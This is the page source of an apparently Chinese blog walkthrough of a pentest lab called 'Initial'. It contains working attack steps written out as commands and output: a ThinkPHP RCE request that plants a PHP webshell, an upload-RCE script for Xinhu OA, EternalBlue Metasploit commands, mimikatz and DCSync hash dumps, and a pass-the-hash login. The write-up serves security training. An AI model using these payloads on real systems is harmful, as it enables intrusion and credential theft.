&#39;r&#43;&#39;)}) filepath = str(r.json()[&#39;filepath&#39;]) filepath = &#34;/&#34; &#43; filepath.split(&#39;.uptemp&#39;)[0] &#43; &#39;.php&#39; id = r.json()[&#39;id&#39;] url3 = url_pre &#43; f&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}&#39; r = session.get(url3) data2 = { &#34;1&#34;: &#34;system(&#39;whoami&#39;);&#34; } print(url_pre &#43; filepath) r = session.post(url_pre &#43; filepath, data=data2) print(r.text) 蚁剑,找到了flag2
+发现这是一台域内机器，域控服务器是172.22.1.2:
+ipconfig/all Windows IP 配置 主机名 . . . . . . . . . . . . . : XIAORANG-OA01 主 DNS 后缀 . . . . . . . . . . . : xiaorang.lab 节点类型 . . . . . . . . . . . . : 混合 IP 路由已启用 . . . . . . . . . . : 否 WINS 代理已启用 . . . . . . . . . : 否 DNS 后缀搜索列表 . . . . . . . . : xiaorang.lab 以太网适配器 以太网 2: 连接特定的 DNS 后缀 . . . . . . . : 描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter #2 物理地址. . . . . . . . . . . . . : 00-16-3E-2A-7D-19 DHCP 已启用 . . . . . . . . . . . : 是 自动配置已启用. . . . . . . . . . : 是 本地链接 IPv6 地址. . . . . . . . : fe80::cc10:4360:27c3:45b%20(首选) IPv4 地址 . . . . . . . . . . . . : 172.22.1.18(首选) 子网掩码 . . . . . . . . . . . . : 255.255.0.0 获得租约的时间 . . . . . . . . . : 2024年10月27日 14:30:10 租约过期的时间 . . . . . . . . . : 2034年10月25日 14:30:22 默认网关. . . . . . . . . . . . . : 172.22.255.253 DHCP 服务器 . . . . . . . . . . . : 172.22.255.253 DHCPv6 IAID . . . . . . . . . . . : 335550014 DHCPv6 客户端 DUID . . . . . . . : 00-01-00-01-2B-6B-CC-B2-00-16-3E-0F-D8-B9 DNS 服务器 . . . . . . . . . . . : 172.22.1.2 TCPIP 上的 NetBIOS . . . . . . . : 已启用 隧道适配器 isatap.{C44145A9-57B2-4C3A-8DC5-A99E0964E798}: 媒体状态 . . . . . . . . . . . . : 媒体已断开 连接特定的 DNS 后缀 . . . . . . . : 描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter 物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP 已启用 . . . . . . . . . . . : 否 自动配置已启用. . . . . . . . . . : 是 flag3 MS17-010&#43;抓hash登域控 proxychains4 msfconsole 也可以直接set proxies socks5:127.0.0.1:7777 因为目标机器不出网，payload用bind_tcp
+search ms17-010 use exploit/windows/smb/ms17_010_eternalblue set payload windows/x64/meterpreter/bind_tcp set RHOSTS 172.22.1.21 run 抓一下hash
+meterpreter &gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http://pingcastle.com / http://mysmartlogon.com ***/ Success. meterpreter &gt; creds_all [&#43;] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain NTLM SHA1 -------- ------ ---- ---- XIAORANG-WIN7$ XIAORANG a4608f945dbe2811e2848e0ce1d6cdfe d22b6269bf9bb42e726a8b29ce3993601cd908c2 wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) XIAORANG-WIN7$ XIAORANG 3c 70 e3 19 a1 37 fe 66 39 ed cb ba 0e ec 4c f3 b7 c7 b1 86 42 fb 08 84 5c 06 aa 3d f2 3b 10 41 0f 8c cc 6b 64 7e 0d 05 81 21 c5 85 8b 53 92 95 e0 5d 42 77 31 69 ba b1 42 3f 1d ea 73 72 88 be 48 c6 93 ab d2 f8 fc a6 25 16 fd 11 2c 7 b 6e 7b 16 c5 5e 86 11 30 35 27 80 09 e3 05 6a 5f 59 57 e9 85 3a d7 17 34 67 5d 69 b1 80 67 7f ca 9c 60 d6 e8 88 63 2c 42 1b 0b f1 cc e8 4c c0 31 b3 64 56 29 cc ad 4a 77 91 79 67 27 2f ec 03 0e d7 61 93 27 02 04 ff 85 a7 b3 e9 e6 47 d7 0b 38 cd 36 5d 9a ed c1 73 08 b6 6f d7 21 5b 47 b2 ec ee 0c 4d 22 9a b4 e8 ac 73 9a b0 90 12 ad 34 6c 95 ee 2c d 8 91 ec 6f d7 55 ed f4 b7 de 37 88 16 ea 91 5d f5 5b da 3f 66 30 87 35 de 57 1e 5a 42 f3 1c 31 20 2a 94 1f 8c 8d 98 16 d1 ec f5 1b ba c7 79 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) xiaorang-win7$ XIAORANG.LAB 3c 70 e3 19 a1 37 fe 66 39 ed cb ba 0e ec 4c f3 b7 c7 b1 86 42 fb 08 84 5c 06 aa 3d f2 3b 10 41 0f 8c cc 6b 64 7 e 0d 05 81 21 c5 85 8b 53 92 95 e0 5d 42 77 31 69 ba b1 42 3f 1d ea 73 72 88 be 48 c6 93 ab d2 f8 fc a6 25 16 fd 11 2c 7b 6e 7b 16 c5 5e 86 11 30 35 27 80 09 e3 05 6a 5f 59 57 e9 85 3a d7 17 34 67 5d 69 b1 80 67 7f ca 9c 60 d6 e8 88 63 2c 42 1b 0b f1 cc e8 4c c0 31 b3 64 56 29 cc ad 4a 77 91 79 67 27 2f ec 03 0e d7 61 93 27 02 04 ff 8 5 a7 b3 e9 e6 47 d7 0b 38 cd 36 5d 9a ed c1 73 08 b6 6f d7 21 5b 47 b2 ec ee 0c 4d 22 9a b4 e8 ac 73 9a b0 90 12 ad 34 6c 95 ee 2c d8 91 ec 6f d7 55 ed f4 b7 de 37 88 16 ea 91 5d f5 5b da 3f 66 30 87 35 de 57 1e 5a 42 f3 1c 31 20 2a 94 1f 8c 8d 98 16 d1 ec f5 1b ba c7 79 xiaorang-win7$ XIAORANG.LAB (null) 上传SharpHound.exe收集有关领域内的信息
+meterpreter &gt; upload &#34;/Users/lnhsec/Desktop/Sec/redteam/tools/内网/SharpHound-v2.5.8/SharpHound.exe&#34; &#34;C:/SharpHound.exe&#34; meterpreter &gt; shell chcp 65001 cd C:/ SharpHound.exe -c all meterpreter &gt; download &#34;C:/20241027154232_BloodHound.zip&#34; &#34;/Users/lnhsec/Desktop/&#34; BloodHound 分析:
+curl -L https://ghst.ly/getbhce | docker compose -f - up 8080端口 账号admin 因为这台机器有 DCSync 的权限, 所以能直接从域控上导出 Hash。利用DCSync域内dump所有用户的hash
+meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv [DC] &#39;xiaorang.lab&#39; will be the domain [DC] &#39;DC01.xiaorang.lab&#39; will be the DC server [DC] Exporting domain &#39;xiaorang.lab&#39; [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) 502	krbtgt	fb812eea13a18b7fcdb8e6d67ddc205b	514 1106	Marcus	e07510a4284b3c97c8e7dee970918c5c	512 1107	Charles	f6a9881cd5ae709abb4ac9ab87f24617	512 1000	DC01$	4450359029240b6aee687552fab52618	532480 500	Administrator	10cf89a850fb1cdbe6bb432b859164c8	512 1104	XIAORANG-OA01$	2408e055546207b9dcaa5230c2f0126a	4096 1108	XIAORANG-WIN7$	a4608f945dbe2811e2848e0ce1d6cdfe	4096 利用impacket-wmiexec进行横向移动来访问域控制，在C:\Users\Administrator\flag\flag03.txt中得到第三部分flag
+python wmiexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 " />
+<meta property="og:locale" content="en-us" /><meta property="og:image" content="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20241001120146127.png" />
+
+
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/index.css">
+<link href="/index.xml" rel="alternate" type="application/rss+xml" title="末流双非的救赎之道">
+</head>
+
+<body>
+  <nav class="headnav">
+  <a href="/" class="logo">w0s1np</a>
+  <ul id="menu">
+    
+    <li><a href="/blog/">归档</a></li>
+    
+    <li><a href="/tags/">标签</a></li>
+    
+    <li><a href="/search">搜索</a></li>
+    
+    <li><a href="/about/">关于</a></li>
+    
+    <li><a href="/index.xml" target="_blank">RSS</a></li>
+  </ul>
+</nav>
+  <section>
+    
+    <div class="body-title">春秋云镜 Initial</div>
+
+    
+    <div class="post-meta">
+      <time> 2024-10-27</time>
+      
+
+      <span class="tag-node">
+        
+        标签：
+        
+        <a href="/tags/pentest">#Pentest</a>
+        
+        
+      </span>
+
+    </div>
+    
+
+    
+    <div class="toc">
+      <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#flag1-thinkphp">flag1 thinkphp</a></li>
+        <li><a href="#flag2-信呼oa228弱口令文件上传rce">flag2 信呼OA2.2.8弱口令+文件上传rce</a></li>
+        <li><a href="#flag3-ms17-010抓hash登域控">flag3 MS17-010+抓hash登域控</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+    </div>
+    
+
+    <article class="post-content">
+      
+      <p>Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。</p>
+<h2 id="flag1-thinkphp">flag1 thinkphp</h2>
+<p>fscan 发现 thinkphp5.0.23 rce</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://39.99.247.86/index.php?s<span class="o">=</span>captcha
+</span></span><span class="line"><span class="cl"><span class="nv">_method</span><span class="o">=</span>__construct<span class="p">&amp;</span>filter<span class="o">[]=</span>system<span class="p">&amp;</span><span class="nv">method</span><span class="o">=</span>get<span class="p">&amp;</span>server<span class="o">[</span>REQUEST_METHOD<span class="o">]=</span><span class="nb">echo</span> PD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKTs/Pg<span class="o">==</span><span class="p">|</span>base64 -d &gt; /var/www/html/1.php
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410271734360.png" alt="image.png"></p>
+<p>蚁剑连接+suid提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>www-data:/var/www/html<span class="o">)</span> $ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on ubuntu-web01:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on ubuntu-web01:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/mysql
+</span></span><span class="line"><span class="cl"><span class="o">(</span>www-data:/var/www/html<span class="o">)</span> $ sudo mysql -e <span class="s1">&#39;\! whoami&#39;</span>
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo mysql -e <span class="s1">&#39;\! /bin/sh&#39;</span>
+</span></span></code></pre></div><h2 id="flag2-信呼oa228弱口令文件上传rce">flag2 信呼OA2.2.8弱口令+文件上传rce</h2>
+<p>上传代理和fsca配置代理</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">172.22.1.18:3306 open
+</span></span><span class="line"><span class="cl">172.22.1.18:445 open
+</span></span><span class="line"><span class="cl">172.22.1.2:445 open
+</span></span><span class="line"><span class="cl">172.22.1.21:445 open
+</span></span><span class="line"><span class="cl">172.22.1.2:139 open
+</span></span><span class="line"><span class="cl">172.22.1.18:139 open
+</span></span><span class="line"><span class="cl">172.22.1.21:139 open
+</span></span><span class="line"><span class="cl">172.22.1.18:135 open
+</span></span><span class="line"><span class="cl">172.22.1.2:135 open
+</span></span><span class="line"><span class="cl">172.22.1.18:80 open
+</span></span><span class="line"><span class="cl">172.22.1.15:80 open
+</span></span><span class="line"><span class="cl">172.22.1.15:22 open
+</span></span><span class="line"><span class="cl">172.22.1.2:88 open
+</span></span><span class="line"><span class="cl">172.22.1.21:135 open
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.18
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>XIAORANG-OA01
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.1.18
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.21
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>XIAORANG-WIN7
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.1.21
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetInfo 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.2
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>DC01
+</span></span><span class="line"><span class="cl">   <span class="o">[</span>-&gt;<span class="o">]</span>172.22.1.2
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> MS17-010 172.22.1.21	<span class="o">(</span>Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="m">2008</span> R2 Enterprise <span class="m">7601</span> Service Pack <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="m">2012</span> R2 Datacenter <span class="m">9600</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> OsInfo 172.22.1.2	<span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter 14393<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NetBios 172.22.1.2      <span class="o">[</span>+<span class="o">]</span> DC:DC01.xiaorang.lab             Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m<span class="o">=</span>login
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> WebTitle http://172.22.1.18?m<span class="o">=</span>login code:200 len:4012   title:信呼协同办公系统
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
+</span></span></code></pre></div><p>整理如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.18 <span class="o">[</span>-&gt;<span class="o">]</span>XIAORANG-OA01
+</span></span><span class="line"><span class="cl">	端口: 135,80,3306,445,139
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.21 <span class="o">[</span>-&gt;<span class="o">]</span>XIAORANG-WIN7
+</span></span><span class="line"><span class="cl">	端口: 445,135,139
+</span></span><span class="line"><span class="cl">	MS17-010
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>172.22.1.2 <span class="o">[</span>-&gt;<span class="o">]</span>DC01
+</span></span><span class="line"><span class="cl">	端口: 135,139,445,88
+</span></span></code></pre></div><p>172.22.1.18 信呼 OA v2.2.8</p>
+<p>弱口令 admin/admin123</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">import requests
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">session</span> <span class="o">=</span> requests.session<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">url_pre</span> <span class="o">=</span> <span class="s1">&#39;http://172.22.1.18/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">url1</span> <span class="o">=</span> url_pre + <span class="s1">&#39;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">url2</span> <span class="o">=</span> url_pre + <span class="s1">&#39;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">url3</span> <span class="o">=</span> url_pre + <span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">data1</span> <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;rempass&#39;</span>: <span class="s1">&#39;0&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;jmpass&#39;</span>: <span class="s1">&#39;false&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;device&#39;</span>: <span class="s1">&#39;1625884034525&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;ltype&#39;</span>: <span class="s1">&#39;0&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminuser&#39;</span>: <span class="s1">&#39;YWRtaW4=&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;adminpass&#39;</span>: <span class="s1">&#39;YWRtaW4xMjM=&#39;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;yanzm&#39;</span>: <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">r</span> <span class="o">=</span> session.post<span class="o">(</span>url1, <span class="nv">data</span><span class="o">=</span>data1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">r</span> <span class="o">=</span> session.post<span class="o">(</span>url2, <span class="nv">files</span><span class="o">={</span><span class="s1">&#39;file&#39;</span>: open<span class="o">(</span><span class="s1">&#39;1.php&#39;</span>, <span class="s1">&#39;r+&#39;</span><span class="o">)})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">filepath</span> <span class="o">=</span> str<span class="o">(</span>r.json<span class="o">()[</span><span class="s1">&#39;filepath&#39;</span><span class="o">])</span>
+</span></span><span class="line"><span class="cl"><span class="nv">filepath</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> + filepath.split<span class="o">(</span><span class="s1">&#39;.uptemp&#39;</span><span class="o">)[</span>0<span class="o">]</span> + <span class="s1">&#39;.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">id</span> <span class="o">=</span> r.json<span class="o">()[</span><span class="s1">&#39;id&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">url3</span> <span class="o">=</span> url_pre + f<span class="s1">&#39;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">r</span> <span class="o">=</span> session.get<span class="o">(</span>url3<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">data2</span> <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1&#34;</span>: <span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">print<span class="o">(</span>url_pre + filepath<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">r</span> <span class="o">=</span> session.post<span class="o">(</span>url_pre + filepath, <span class="nv">data</span><span class="o">=</span>data2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">print<span class="o">(</span>r.text<span class="o">)</span>
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410271734865.png" alt="image.png"></p>
+<p>蚁剑,找到了flag2</p>
+<p>发现这是一台域内机器，域控服务器是172.22.1.2:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ipconfig/all
+</span></span><span class="line"><span class="cl">Windows IP 配置
+</span></span><span class="line"><span class="cl">   主机名  . . . . . . . . . . . . . : XIAORANG-OA01
+</span></span><span class="line"><span class="cl">   主 DNS 后缀 . . . . . . . . . . . : xiaorang.lab
+</span></span><span class="line"><span class="cl">   节点类型  . . . . . . . . . . . . : 混合
+</span></span><span class="line"><span class="cl">   IP 路由已启用 . . . . . . . . . . : 否
+</span></span><span class="line"><span class="cl">   WINS 代理已启用 . . . . . . . . . : 否
+</span></span><span class="line"><span class="cl">   DNS 后缀搜索列表  . . . . . . . . : xiaorang.lab
+</span></span><span class="line"><span class="cl">以太网适配器 以太网 2:
+</span></span><span class="line"><span class="cl">   连接特定的 DNS 后缀 . . . . . . . : 
+</span></span><span class="line"><span class="cl">   描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter <span class="c1">#2</span>
+</span></span><span class="line"><span class="cl">   物理地址. . . . . . . . . . . . . : 00-16-3E-2A-7D-19
+</span></span><span class="line"><span class="cl">   DHCP 已启用 . . . . . . . . . . . : 是
+</span></span><span class="line"><span class="cl">   自动配置已启用. . . . . . . . . . : 是
+</span></span><span class="line"><span class="cl">   本地链接 IPv6 地址. . . . . . . . : fe80::cc10:4360:27c3:45b%20<span class="o">(</span>首选<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">   IPv4 地址 . . . . . . . . . . . . : 172.22.1.18<span class="o">(</span>首选<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">   子网掩码  . . . . . . . . . . . . : 255.255.0.0
+</span></span><span class="line"><span class="cl">   获得租约的时间  . . . . . . . . . : 2024年10月27日 14:30:10
+</span></span><span class="line"><span class="cl">   租约过期的时间  . . . . . . . . . : 2034年10月25日 14:30:22
+</span></span><span class="line"><span class="cl">   默认网关. . . . . . . . . . . . . : 172.22.255.253
+</span></span><span class="line"><span class="cl">   DHCP 服务器 . . . . . . . . . . . : 172.22.255.253
+</span></span><span class="line"><span class="cl">   DHCPv6 IAID . . . . . . . . . . . : <span class="m">335550014</span>
+</span></span><span class="line"><span class="cl">   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-2B-6B-CC-B2-00-16-3E-0F-D8-B9
+</span></span><span class="line"><span class="cl">   DNS 服务器  . . . . . . . . . . . : 172.22.1.2
+</span></span><span class="line"><span class="cl">   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+</span></span><span class="line"><span class="cl">隧道适配器 isatap.<span class="o">{</span>C44145A9-57B2-4C3A-8DC5-A99E0964E798<span class="o">}</span>:
+</span></span><span class="line"><span class="cl">   媒体状态  . . . . . . . . . . . . : 媒体已断开
+</span></span><span class="line"><span class="cl">   连接特定的 DNS 后缀 . . . . . . . : 
+</span></span><span class="line"><span class="cl">   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter
+</span></span><span class="line"><span class="cl">   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+</span></span><span class="line"><span class="cl">   DHCP 已启用 . . . . . . . . . . . : 否
+</span></span><span class="line"><span class="cl">   自动配置已启用. . . . . . . . . . : 是
+</span></span></code></pre></div><h2 id="flag3-ms17-010抓hash登域控">flag3 MS17-010+抓hash登域控</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 msfconsole
+</span></span><span class="line"><span class="cl">也可以直接set proxies socks5:127.0.0.1:7777
+</span></span></code></pre></div><p>因为目标机器不出网，payload用<code>bind_tcp</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">search ms17-010
+</span></span><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/x64/meterpreter/bind_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 172.22.1.21
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410271734769.png" alt="image.png"></p>
+<p>抓一下<code>hash</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; load kiwi
+</span></span><span class="line"><span class="cl">Loading extension kiwi...
+</span></span><span class="line"><span class="cl">  .#####.   mimikatz 2.2.0 <span class="m">20191125</span> <span class="o">(</span>x64/windows<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> .## ^ <span class="c1">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+</span></span><span class="line"><span class="cl"> <span class="c1">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
+</span></span><span class="line"><span class="cl"> <span class="s1">&#39;## v ##&#39;</span>        Vincent LE TOUX            <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="s1">&#39;#####&#39;</span>         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Success.
+</span></span><span class="line"><span class="cl">meterpreter &gt; creds_all
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running as SYSTEM
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving all credentials
+</span></span><span class="line"><span class="cl">msv <span class="nv">credentials</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Username        Domain    NTLM                              SHA1
+</span></span><span class="line"><span class="cl">--------        ------    ----                              ----
+</span></span><span class="line"><span class="cl">XIAORANG-WIN7$  XIAORANG  a4608f945dbe2811e2848e0ce1d6cdfe  d22b6269bf9bb42e726a8b29ce3993601cd908c2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wdigest <span class="nv">credentials</span>
+</span></span><span class="line"><span class="cl"><span class="o">===================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Username        Domain    Password
+</span></span><span class="line"><span class="cl">--------        ------    --------
+</span></span><span class="line"><span class="cl"><span class="o">(</span>null<span class="o">)</span>          <span class="o">(</span>null<span class="o">)</span>    <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">XIAORANG-WIN7$  XIAORANG  3c <span class="m">70</span> e3 <span class="m">19</span> a1 <span class="m">37</span> fe <span class="m">66</span> <span class="m">39</span> ed cb ba 0e ec 4c f3 b7 c7 b1 <span class="m">86</span> <span class="m">42</span> fb <span class="m">08</span> <span class="m">84</span> 5c <span class="m">06</span> aa 3d f2 3b <span class="m">10</span> <span class="m">41</span> 0f 8c cc 6b <span class="m">64</span> 7e 0d
+</span></span><span class="line"><span class="cl">                           <span class="m">05</span> <span class="m">81</span> <span class="m">21</span> c5 <span class="m">85</span> 8b <span class="m">53</span> <span class="m">92</span> <span class="m">95</span> e0 5d <span class="m">42</span> <span class="m">77</span> <span class="m">31</span> <span class="m">69</span> ba b1 <span class="m">42</span> 3f 1d ea <span class="m">73</span> <span class="m">72</span> <span class="m">88</span> be <span class="m">48</span> c6 <span class="m">93</span> ab d2 f8 <span class="nb">fc</span> a6 <span class="m">25</span> <span class="m">16</span> fd <span class="m">11</span> 2c <span class="m">7</span>
+</span></span><span class="line"><span class="cl">                          b 6e 7b <span class="m">16</span> c5 5e <span class="m">86</span> <span class="m">11</span> <span class="m">30</span> <span class="m">35</span> <span class="m">27</span> <span class="m">80</span> <span class="m">09</span> e3 <span class="m">05</span> 6a 5f <span class="m">59</span> <span class="m">57</span> e9 <span class="m">85</span> 3a d7 <span class="m">17</span> <span class="m">34</span> <span class="m">67</span> 5d <span class="m">69</span> b1 <span class="m">80</span> <span class="m">67</span> 7f ca 9c <span class="m">60</span> d6 e8 <span class="m">88</span> <span class="m">63</span>
+</span></span><span class="line"><span class="cl">                          2c <span class="m">42</span> 1b 0b f1 cc e8 4c c0 <span class="m">31</span> b3 <span class="m">64</span> <span class="m">56</span> <span class="m">29</span> cc ad 4a <span class="m">77</span> <span class="m">91</span> <span class="m">79</span> <span class="m">67</span> <span class="m">27</span> 2f ec <span class="m">03</span> 0e d7 <span class="m">61</span> <span class="m">93</span> <span class="m">27</span> <span class="m">02</span> <span class="m">04</span> ff <span class="m">85</span> a7 b3 e9 e6 <span class="m">47</span>
